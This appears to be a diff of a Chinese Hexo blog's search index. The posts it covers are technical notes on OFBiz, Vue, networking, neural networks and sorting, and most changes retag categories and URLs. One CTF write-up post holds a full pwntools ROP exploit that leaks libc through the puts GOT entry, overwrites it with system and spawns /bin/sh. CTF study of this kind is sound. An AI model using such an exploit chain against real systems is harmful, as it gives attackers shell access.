 <h3 id="二、初始部署"><a href="#二、初始部署" class="headerlink" title="二、初始部署"></a>二、初始部署</h3><h4 id="1、修改learning-ofbiz-component-xml文件中的webapp标签："><a href="#1、修改learning-ofbiz-component-xml文件中的webapp标签：" class="headerlink" title="1、修改learning/ofbiz-component.xml文件中的webapp标签："></a>1、修改learning/ofbiz-component.xml文件中的webapp标签：</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">webapp</span> <span class="attr">name</span>=<span class="string">"learning"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">title</span>=<span class="string">"learning"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">server</span>=<span class="string">"default-server"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">location</span>=<span class="string">"webapp/learning"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">base-permission</span>=<span class="string">"OFBTOOLS"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">mount-point</span>=<span class="string">"/learning"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app-bar-display</span>=<span class="string">"true"</span>/&gt;</span></span><br></pre></td></tr></table></figure>
@@ -2746,15 +2772,18 @@
 <h3 id="结语（本文结束的几个月后所添加的）"><a href="#结语（本文结束的几个月后所添加的）" class="headerlink" title="结语（本文结束的几个月后所添加的）"></a>结语（本文结束的几个月后所添加的）</h3><p>此处推荐一位ofbiz大神博客：<a href="http://ofbizer.iteye.com/blog/2386290" target="_blank" rel="noopener">上海香飘飘</a>，博客中不仅有关于ofbiz的知识，有很多资源链接，读者可以下载阅读。其中就包括入门级指南<em>Apache+OFBiz+开发初学者指南[Ob4.0-EN+Ob9.0-CN].chm</em>。这份指南很全，若能认真反复阅读，必能获益匪浅。</p>
 ]]></content>
       <categories>
-        <category>应用与开发</category>
+        <category>不想开滴滴的外卖骑手不是好码农</category>
+        <category>后端</category>
       </categories>
       <tags>
         <tag>Java</tag>
+        <tag>后端</tag>
+        <tag>Ofbiz</tag>
       </tags>
   </entry>
   <entry>
     <title>ofbiz表单标签树图</title>
-    <url>/application/ofbiz%E8%A1%A8%E5%8D%95%E6%A0%87%E7%AD%BE%E6%A0%91%E5%9B%BE.html</url>
+    <url>/ofbiz%E8%A1%A8%E5%8D%95%E6%A0%87%E7%AD%BE%E6%A0%91%E5%9B%BE.html</url>
     <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>以下是笔者自己总结的，关于ofbiz中form.xml文件的标签树。因本人对ofbiz的研究有限，所以无法体现的所有标签，但也希望能给读者带来帮助。<br>其中有几点需要注意的：</p>
 <ul>
 <li>标签的父子关系通过序号来体现，比如：actions标签的序号是1.1.1，form标签的序号是1.1，所以actions标签就是form的子标签。</li>
@@ -2798,15 +2827,18 @@
 <p>1.1.3.14.2. sort-field—-name</p>
 ]]></content>
       <categories>
-        <category>应用与开发</category>
+        <category>不想开滴滴的外卖骑手不是好码农</category>
+        <category>后端</category>
       </categories>
       <tags>
         <tag>Java</tag>
+        <tag>后端</tag>
+        <tag>Ofbiz</tag>
       </tags>
   </entry>
   <entry>
     <title>ofbiz学习之部署组件2</title>
-    <url>/application/ofbiz%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%83%A8%E7%BD%B2%E7%BB%84%E4%BB%B62.html</url>
+    <url>/ofbiz%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%83%A8%E7%BD%B2%E7%BB%84%E4%BB%B62.html</url>
     <content><![CDATA[<h3 id="一、实现Create以及Update功能"><a href="#一、实现Create以及Update功能" class="headerlink" title="一、实现Create以及Update功能"></a>一、实现Create以及Update功能</h3><p>1、在我们完成的第一张视图中，有一个“新增”按钮，它对应第三—4步的ProductPlan装饰器中的：</p>
 <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">container</span> <span class="attr">style</span>=<span class="string">"button-bar"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">link</span> <span class="attr">target</span>=<span class="string">"EditProductPlan"</span> <span class="attr">text</span>=<span class="string">"新建"</span> <span class="attr">style</span>=<span class="string">"buttontext create"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">container</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <a id="more"></a>
@@ -2863,15 +2895,18 @@
 </ul>
 ]]></content>
       <categories>
-        <category>应用与开发</category>
+        <category>不想开滴滴的外卖骑手不是好码农</category>
+        <category>后端</category>
       </categories>
       <tags>
         <tag>Java</tag>
+        <tag>后端</tag>
+        <tag>Ofbiz</tag>
       </tags>
   </entry>
   <entry>
     <title>vue请求接口获取数据及跨域问题</title>
-    <url>/application/vueJs%E8%AF%B7%E6%B1%82%E6%8E%A5%E5%8F%A3%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E7%9A%84%E5%AE%9E%E7%8E%B0%E5%8F%8A%E9%97%AE%E9%A2%98.html</url>
+    <url>/vueJs%E8%AF%B7%E6%B1%82%E6%8E%A5%E5%8F%A3%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E7%9A%84%E5%AE%9E%E7%8E%B0%E5%8F%8A%E9%97%AE%E9%A2%98.html</url>
     <content><![CDATA[<p>[TOC]</p>
 <h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>本文基于<code>vue-cli3</code>。</p>
 <h2 id="1-通过api接口获取数据"><a href="#1-通过api接口获取数据" class="headerlink" title="1. 通过api接口获取数据"></a>1. 通过api接口获取数据</h2><p>在<code>vuejs</code>中请求接口，大体分为两种方式：<code>vue-source</code>和<code>axios</code>。它们都是经过良好封装的http请求插件。</p>
@@ -2937,21 +2972,22 @@
 <p>由于Vue代理需要利用<code>node</code>服务器，所以<strong>只适用于本地<code>npm run serve</code>调试</strong>时。</p>
 <p>当项目部署到服务器时，可以使用<code>CROS</code>方式、<code>nginx</code>反向代理等方式。</p>
 <h4 id="2-3-3-nginx反向代理"><a href="#2-3-3-nginx反向代理" class="headerlink" title="2.3.3. nginx反向代理"></a>2.3.3. nginx反向代理</h4><p>只需要在<code>nginx.conf</code>配置文件的<code>vue</code>项目对应的<code>server</code>中，添加：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 匹配vue项目中所有以/api开头的请求url</span><br><span class="line">location /api &#123;</span><br><span class="line">    include  uwsgi_params;</span><br><span class="line">    proxy_pass   http://0.0.0.0:8081; # 要代理访问的后端url</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 匹配vue项目中所有以&#x2F;api开头的请求url</span><br><span class="line">location &#x2F;api &#123;</span><br><span class="line">    include  uwsgi_params;</span><br><span class="line">    proxy_pass   http:&#x2F;&#x2F;0.0.0.0:8081; # 要代理访问的后端url</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>完整示例如下：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen       8000;</span><br><span class="line">    listen       80;</span><br><span class="line">    server_name  _;</span><br><span class="line">    root         /pathto/vue_project/;</span><br><span class="line"></span><br><span class="line">    # Load configuration files for the default server block.</span><br><span class="line">    include /etc/nginx/default.d/*.conf;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        index index.html;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    error_page 404 /404.html;</span><br><span class="line">        location = /40x.html &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    error_page 500 502 503 504 /50x.html;</span><br><span class="line">        location = /50x.html &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location /api &#123;</span><br><span class="line">        include  uwsgi_params;</span><br><span class="line">        proxy_pass   http://0.0.0.0:8081;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen       8000;</span><br><span class="line">    listen       80;</span><br><span class="line">    server_name  _;</span><br><span class="line">    root         &#x2F;pathto&#x2F;vue_project&#x2F;;</span><br><span class="line"></span><br><span class="line">    # Load configuration files for the default server block.</span><br><span class="line">    include &#x2F;etc&#x2F;nginx&#x2F;default.d&#x2F;*.conf;</span><br><span class="line"></span><br><span class="line">    location &#x2F; &#123;</span><br><span class="line">        index index.html;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    error_page 404 &#x2F;404.html;</span><br><span class="line">        location &#x3D; &#x2F;40x.html &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    error_page 500 502 503 504 &#x2F;50x.html;</span><br><span class="line">        location &#x3D; &#x2F;50x.html &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location &#x2F;api &#123;</span><br><span class="line">        include  uwsgi_params;</span><br><span class="line">        proxy_pass   http:&#x2F;&#x2F;0.0.0.0:8081;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
-        <category>应用与开发</category>
+        <category>不想开滴滴的外卖骑手不是好码农</category>
+        <category>前端</category>
       </categories>
       <tags>
-        <tag>Frontend</tag>
-        <tag>Javascript</tag>
+        <tag>前端</tag>
+        <tag>Vue</tag>
       </tags>
   </entry>
   <entry>
     <title>python实现BP神经网络</title>
-    <url>/cs-pro/python%E5%AE%9E%E7%8E%B0BP%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C.html</url>
+    <url>/python%E5%AE%9E%E7%8E%B0BP%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C.html</url>
     <content><![CDATA[<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>有幸，在软件可靠性课程的实验中，被要求实现BP神经网络模型。虽然，我觉得这门课程搭配这样的实验很无厘头，但正好趁这个机会，重新学习一下神经网络知识。学校的课程设计总归是不太令人满意的，但只要能学到有益的知识，就是赚到了。至于学分、绩点多少，就无关紧要了。</p>
 <p>BP神经网络模型简介：</p>
 <p>BP神经网络模型是1986年由Rumelhart和McClelland为首的科学家提出的概念，是一种按照误差逆向传播算法训练的多层前馈神经网络，是目前应用最广泛的神经网络。</p>
@@ -3060,16 +3096,18 @@
 </ul>
 ]]></content>
       <categories>
-        <category>计算机进阶</category>
+        <category>欲穷千里目，更上一层楼</category>
+        <category>人工智能</category>
       </categories>
       <tags>
         <tag>Python</tag>
         <tag>深度学习</tag>
+        <tag>人工智能</tag>
       </tags>
   </entry>
   <entry>
     <title>《计算机网络》笔记-第1章计算机网络和因特网</title>
-    <url>/cs/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC1%E7%AB%A0%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%92%8C%E5%9B%A0%E7%89%B9%E7%BD%91.html</url>
+    <url>/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC1%E7%AB%A0%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%92%8C%E5%9B%A0%E7%89%B9%E7%BD%91.html</url>
     <content><![CDATA[<p>[TOC]</p>
 <h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>鉴于计算机网络的重要性，以及即将开设的计算机网络课程，我决定利用寒假的时间认真研读 <strong>《计算机网络——自顶向下方法》第7版</strong>，并撰写阅读笔记。</p>
 <p>愚以为，计算机网络是计算机领域中基础且重要的部分，必须牢固掌握。相对于各种新兴框架，计算机网络才是提高计算机素养的关键之一。值得我们花时间去阅读、研究和实践。</p>
@@ -3386,7 +3424,8 @@
 </ul>
 ]]></content>
       <categories>
-        <category>计算机基础</category>
+        <category>九层之台，起于累土</category>
+        <category>计算机网络</category>
       </categories>
       <tags>
         <tag>计算机网络</tag>
@@ -3394,7 +3433,7 @@
   </entry>
   <entry>
     <title>pwn栈溢出-基本ROP</title>
-    <url>/cs/pwn%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP.html</url>
+    <url>/pwn%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP.html</url>
     <content><![CDATA[<p>[TOC]</p>
 <h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>接触ctf一年有余，作为一名ctf老菜鸟，没写过一篇ctf相关博客，确实不该。</p>
 <p>本文介绍pwn入门操作————基本ROP，主要用于自我笔记，不包含详细原理细节。</p>
@@ -3442,15 +3481,17 @@
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">pwn_file=<span class="string">'./Emachine'</span></span><br><span class="line"></span><br><span class="line">elf=ELF(pwn_file)</span><br><span class="line">r = process(pwn_file)</span><br><span class="line"><span class="comment"># r = remote('120.27.3.220', '10010')</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 绕过</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">(num64)</span>:</span></span><br><span class="line">    ret = num64</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">        temp = <span class="number">0xff</span> &lt;&lt; (<span class="number">8</span>*i)</span><br><span class="line">        a = num64 &amp; temp</span><br><span class="line">        a = a &gt;&gt; (<span class="number">8</span>*i)</span><br><span class="line">        <span class="comment"># print(hex(temp), hex(a))</span></span><br><span class="line">        <span class="keyword">if</span> a&gt;=<span class="number">54</span> <span class="keyword">and</span> a&lt;=<span class="number">63</span>:</span><br><span class="line">            a = a ^ <span class="number">0xf</span></span><br><span class="line">        <span class="keyword">elif</span> (a&gt;=<span class="number">64</span> <span class="keyword">and</span> a&lt;=<span class="number">77</span>) <span class="keyword">or</span> a == <span class="number">79</span> <span class="keyword">or</span> a == <span class="number">84</span> <span class="keyword">or</span> (a&gt;=<span class="number">86</span> <span class="keyword">and</span> a&lt;=<span class="number">95</span>):</span><br><span class="line">            a = a ^ <span class="number">0xe</span></span><br><span class="line">        <span class="keyword">elif</span> (a&gt;=<span class="number">96</span> <span class="keyword">and</span> a&lt;=<span class="number">109</span>) <span class="keyword">or</span> a == <span class="number">111</span> <span class="keyword">or</span> a == <span class="number">116</span> <span class="keyword">or</span> (a&gt;=<span class="number">118</span> <span class="keyword">and</span> a&lt;=<span class="number">127</span>):</span><br><span class="line">            a = a ^ <span class="number">0xD</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            a = a</span><br><span class="line">        a = a &lt;&lt; (<span class="number">8</span>*i)</span><br><span class="line">        ret = ret | a</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">gets_plt = elf.plt[<span class="string">'gets'</span>]</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x400c83</span> <span class="comment"># pop rdi;ret 指令地址。通过 ROPgadgets --binary xxx 获取</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出got表中puts函数的地址：</span></span><br><span class="line"><span class="comment"># 1. 0x58覆盖返回地址之前的内容</span></span><br><span class="line"><span class="comment"># 2. pop_rdi将控制(rip)转移到pop rdi;ret处，实现64位系统传参；func()绕过题目的字符串处理</span></span><br><span class="line"><span class="comment"># 3. pop rdi 将got表中puts函数地址pop到rdi中</span></span><br><span class="line"><span class="comment"># 4. ret = pop rip 将控制转到plt中调用puts函数处。实现puts函数调用，参数为got表中puts函数项的地址</span></span><br><span class="line">payload = <span class="string">'1'</span> * <span class="number">0x58</span> + p64(func(pop_rdi)) + p64(puts_got) + p64(puts_plt)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 上一步puts函数执行结束，控制转到pop_rdi处。传参到rdi，然后调用gets函数，读取输入字符串(system函数地址)修改got表的puts函数项(got表可写)</span></span><br><span class="line">payload += p64(pop_rdi) + p64(puts_got) + p64(gets_plt)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 同上，读取输入字符串(\bin\sh)到got表的一处中。此处读取到其它可写区域(如bss)亦可</span></span><br><span class="line">payload += p64(pop_rdi) + p64(puts_got + <span class="number">8</span>) + p64(gets_plt)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将上一步写到got表中的字符串首地址作为参数，通过plt表调用puts函数，但此时got表中的puts函数项已被修改成其它函数(system)的地址</span></span><br><span class="line">payload += p64(pop_rdi) + p64(puts_got + <span class="number">8</span>) + p64(puts_plt)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">'1'</span>)</span><br><span class="line">r.recvuntil(<span class="string">'choice!\n'</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvuntil(<span class="string">'\x83\x0c@\n'</span>) <span class="comment"># 接收 \x83\x0c@\n 之前的输出</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print '---&gt; ' + r.recv()</span></span><br><span class="line">puts_addr = u64(r.recv(timeout=<span class="number">5</span>)[:<span class="number">6</span>].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) <span class="comment"># 通过打印got表中puts函数项，拿到puts函数在内存中地址</span></span><br><span class="line">log.success(<span class="string">'puts() addr ---&gt; '</span> + hex(puts_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">'puts'</span>, puts_addr) <span class="comment"># 通过puts函数地址推出lib库版本</span></span><br><span class="line">libc_addr = puts_addr - libc.dump(<span class="string">'puts'</span>) <span class="comment"># 通过puts函数在lib库中的偏移得到lib库在内存中的基址</span></span><br><span class="line">system_addr = libc_addr + libc.dump(<span class="string">'system'</span>) <span class="comment"># 通过偏移计算system函数的内存地址</span></span><br><span class="line"></span><br><span class="line">r.sendline(p64(system_addr)) <span class="comment"># 输入system函数地址，此处为了覆盖got表中puts函数项</span></span><br><span class="line">r.sendline(<span class="string">'/bin/sh\x00'</span>)   <span class="comment"># 输入system函数参数，写到 puts_got + 8 中</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
-        <category>计算机基础</category>
+        <category>九层之台，起于累土</category>
+        <category>信息安全</category>
       </categories>
       <tags>
         <tag>信息安全</tag>
+        <tag>Pwn</tag>
       </tags>
   </entry>
   <entry>
     <title>八大排序算法</title>
-    <url>/cs/%E5%85%AB%E5%A4%A7%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95.html</url>
+    <url>/%E5%85%AB%E5%A4%A7%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95.html</url>
     <content><![CDATA[<h3 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h3><p>众所周知，对于顺序表，以<strong>二分法</strong>查找一个数，算法时间复杂度为<code>O(nlongn)</code>。因而，一次排好序，便可以节约很多查找的时间。</p>
 <p>由此可见，排序算法尤为重要。以下介绍八大排序算法，都是从小到大排序。</p>
 <a id="more"></a>
@@ -3496,15 +3537,16 @@
 <h3 id="10-代码"><a href="#10-代码" class="headerlink" title="10. 代码"></a>10. 代码</h3><p>更多详细代码和时间复杂度比较，见<a href="https://github.com/99MyCql/DS_and_Algorithms" target="_blank" rel="noopener">github</a></p>
 ]]></content>
       <categories>
-        <category>计算机基础</category>
+        <category>九层之台，起于累土</category>
+        <category>数据结构与算法</category>
       </categories>
       <tags>
-        <tag>算法</tag>
+        <tag>数据结构与算法</tag>
       </tags>
   </entry>
   <entry>
     <title>《计算机网络》笔记-第2章应用层</title>
-    <url>/cs/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC2%E7%AB%A0%E5%BA%94%E7%94%A8%E5%B1%82.html</url>
+    <url>/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC2%E7%AB%A0%E5%BA%94%E7%94%A8%E5%B1%82.html</url>
     <content><![CDATA[<p>[TOC]</p>
 <h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><blockquote>
 <p>Chapter 2 Application Layer</p>
@@ -3665,7 +3707,7 @@
 </ul>
 </li>
 <li><p><strong>URL</strong>：又称统一资源定位符，其标准格式如下：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">协议类型://服务器IP地址[:需要时加上端口号]/路径/文件名</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">协议类型:&#x2F;&#x2F;服务器IP地址[:需要时加上端口号]&#x2F;路径&#x2F;文件名</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>HTTP版本：当下常见的为HTTP/1.1</p>
 </li>
@@ -3874,7 +3916,7 @@
 </li>
 <li><p><strong>主机别名(host aliasing)</strong>。例如，一台名为<code>relay1.west-coast.enterprise.com</code>的主机，可能还有两个别名：<code>enterprise.com</code>和<code>www.enterprise.com</code>。此时，<code>relay1.west-coast.enterprise.com</code>则被称为<strong>规范主机名(canonical hostname)</strong>。应用程序调用DNS可以获得主机别名对应的规范主机名，和主机IP地址。</p>
 </li>
-<li><p><strong>邮件服务器别名(mail server aliasing)</strong>。电子邮件应用程序可以调用DNS，解析对应的主机名（比如：<a href="mailto:`@qq.com" target="_blank" rel="noopener">`@qq.com</a><code>中的</code>qq.com`），以获得该主机的规范主机名和IP地址。</p>
+<li><p><strong>邮件服务器别名(mail server aliasing)</strong>。电子邮件应用程序可以调用DNS，解析对应的主机名（比如：<a href="mailto:`@qq.com">`@qq.com</a><code>中的</code>qq.com`），以获得该主机的规范主机名和IP地址。</p>
 </li>
 <li><p><strong>负载分配(load distribution)</strong>。繁忙的站点（比如：<code>taobao.com</code>）通常拥有多台服务器，每个都有着不同的IP地址。在DNS服务器中，一个<strong>IP地址集合</strong>与同一个规范主机名相联系，在每次回答中，循环响应这些IP地址。从而实现负载分配。</p>
 </li>
@@ -4017,7 +4059,8 @@
 <figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">serverName = <span class="string">'localhost'</span>    <span class="comment"># 服务端地址</span></span><br><span class="line">serverPort = <span class="number">12000</span>          <span class="comment"># 服务端端口</span></span><br><span class="line"></span><br><span class="line">serverSocket = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">serverSocket.bind((serverName, serverPort))</span><br><span class="line">serverSocket.listen(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">'The server is ready to receive'</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment"># 服务端接收到客户端连接请求后，为新客户创建一个特定的套接字。只支持单个用户</span></span><br><span class="line">    connSocket, clientAddress = serverSocket.accept()</span><br><span class="line">    message = connSocket.recv(<span class="number">1024</span>).decode()</span><br><span class="line">    print(<span class="string">"receive: "</span> + str(message) + <span class="string">" [from"</span> + str(clientAddress) + <span class="string">"]"</span>)</span><br><span class="line">    retMessage = message.upper()</span><br><span class="line">    connSocket.send(retMessage.encode())</span><br><span class="line">    connSocket.close()</span><br><span class="line"></span><br><span class="line">    time.sleep(<span class="number">20</span>)</span><br><span class="line">    <span class="keyword">if</span> input(<span class="string">'press q to quit or other to continue:'</span>) == <span class="string">'q'</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
-        <category>计算机基础</category>
+        <category>九层之台，起于累土</category>
+        <category>计算机网络</category>
       </categories>
       <tags>
         <tag>计算机网络</tag>
@@ -4025,7 +4068,7 @@
   </entry>
   <entry>
     <title>《计算机网络》笔记-第6章链路层和局域网</title>
-    <url>/cs/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC6%E7%AB%A0%E9%93%BE%E8%B7%AF%E5%B1%82%E5%92%8C%E5%B1%80%E5%9F%9F%E7%BD%91.html</url>
+    <url>/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC6%E7%AB%A0%E9%93%BE%E8%B7%AF%E5%B1%82%E5%92%8C%E5%B1%80%E5%9F%9F%E7%BD%91.html</url>
     <content><![CDATA[<p>[TOC]</p>
 <h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>通过网络层，我们知道网络如何选择最优路径，将分组从一个主机发送到另一个主机。</p>
 <p>而通过链路层，我们将知道：<strong>分组是如何在构成端到端最优路径的各段物理链路上进行传输的</strong>。</p>
@@ -4213,7 +4256,8 @@
 <h2 id="5-Web-页面请求历程"><a href="#5-Web-页面请求历程" class="headerlink" title="5. Web 页面请求历程"></a>5. Web 页面请求历程</h2><p><img src="《计算机网络》笔记-第6章链路层和局域网/22.png" alt="pic"></p>
 ]]></content>
       <categories>
-        <category>计算机基础</category>
+        <category>九层之台，起于累土</category>
+        <category>计算机网络</category>
       </categories>
       <tags>
         <tag>计算机网络</tag>
@@ -4221,7 +4265,7 @@
   </entry>
   <entry>
     <title>《计算机网络》笔记-第4/5章网络层</title>
-    <url>/cs/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC4-5%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%82.html</url>
+    <url>/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC4-5%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%82.html</url>
     <content><![CDATA[<p>[TOC]</p>
 <h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>综合第4章与第5章的网络层，以及课上老师所讲内容，与书本有较大不同。</p>
 <p>在上一章中，曾提到运输层解决了进程间的通信问题。那么，网络层则解决了<strong>主机间的通信问题</strong>。</p>
@@ -4559,7 +4603,8 @@
 <p>SDN 是当下的一股热潮。其中，相对突出的是 <strong>OpenFlow 协议</strong>，它运行在 SDN 控制器和网络设备上。但在此不做详细介绍。</p>
 ]]></content>
       <categories>
-        <category>计算机基础</category>
+        <category>九层之台，起于累土</category>
+        <category>计算机网络</category>
       </categories>
       <tags>
         <tag>计算机网络</tag>
@@ -4567,7 +4612,7 @@
   </entry>
   <entry>
     <title>再遇javaweb</title>
-    <url>/application/%E5%86%8D%E9%81%87javaweb.html</url>
+    <url>/%E5%86%8D%E9%81%87javaweb.html</url>
     <content><![CDATA[<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>从最初的<code>servlet</code>、<code>Tomcat</code>，到笨重的<code>ofbiz</code>框架，再跳至<code>spring boot</code>，现在又邂逅了<code>jfinal</code>(国内框架，迫于项目要求)。</p>
 <p><code>javaweb</code>的开发之路上，遇见了诸多框架，虽然都有些浅尝辄止，但也想对<code>javaweb</code>中的<strong>项目结构</strong>进行自我的总结归纳。</p>
 <p>其缘由呢，是因为此次碰见的<code>jfinal</code>框架，它支持 热加载(内置服务器) 和 依托<code>Tomcat</code> 两种运行方式。同时，我们可以规范成 <strong>传统 javaweb 标准项目结构</strong> 和 <strong>maven 标准项目结构</strong>。</p>
@@ -4654,16 +4699,17 @@
 <p>参考博客：<a href="https://www.csdn.net/gather_2a/NtTakgwsNDYwLWJsb2cO0O0O.html" target="_blank" rel="noopener">https://www.csdn.net/gather_2a/NtTakgwsNDYwLWJsb2cO0O0O.html</a></p>
 ]]></content>
       <categories>
-        <category>应用与开发</category>
+        <category>不想开滴滴的外卖骑手不是好码农</category>
+        <category>后端</category>
       </categories>
       <tags>
-        <tag>Backend</tag>
         <tag>Java</tag>
+        <tag>后端</tag>
       </tags>
   </entry>
   <entry>
     <title>中断、异常与并发</title>
-    <url>/cs/%E4%B8%AD%E6%96%AD%E4%B8%8E%E5%B9%B6%E5%8F%91.html</url>
+    <url>/%E4%B8%AD%E6%96%AD%E4%B8%8E%E5%B9%B6%E5%8F%91.html</url>
     <content><![CDATA[<p>[TOC]</p>
 <h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>记得在学习《计算机系统组成原理》和阅读CSAPP时，对异常控制流(异常)、并发等内容似懂非懂、雾里看花。</p>
 <p>在学习了汇编语言课程后，才总算有所领会，于是打算进行相应的归纳。</p>
@@ -4734,7 +4780,8 @@
 <p>到这，是不是觉得并发竟然如此简单呢？</p>
 ]]></content>
       <categories>
-        <category>计算机基础</category>
+        <category>九层之台，起于累土</category>
+        <category>计算机系统</category>
       </categories>
       <tags>
